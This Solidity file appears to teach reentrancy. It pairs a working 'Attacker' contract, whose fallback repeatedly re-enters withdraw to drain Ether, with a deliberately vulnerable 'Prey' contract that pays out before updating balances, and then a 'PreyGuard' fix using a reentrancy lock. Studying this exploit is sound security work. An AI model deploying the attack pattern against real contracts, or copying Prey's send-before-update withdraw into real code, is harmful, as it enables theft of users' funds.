// SPDX-License-Identifier: MIT
// ATTENTION: MUST USE 0.6.0 TO COMPILE
pragma solidity ^0.6.0;

contract Attacker {
    Prey public prey;

    constructor(Prey _prey) public {
        prey = _prey;
    }

    // Fallback is called when prey sends Ether to this contract.
    fallback() external payable {
        if (address(prey).balance >= 1 ether) {
            prey.withdraw(1 ether);
        }
    }

    function attack() external payable{
        require(msg.value >= 1 ether);
        prey.deposit{value: msg.value}();
        prey.withdraw(1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Prey {
    mapping(address => uint256) public balances;

    event Received(address, uint);
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount);
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] -= amount;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract PreyGuard is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public noReentrant {
        require(balances[msg.sender] >= amount);

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= amount;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}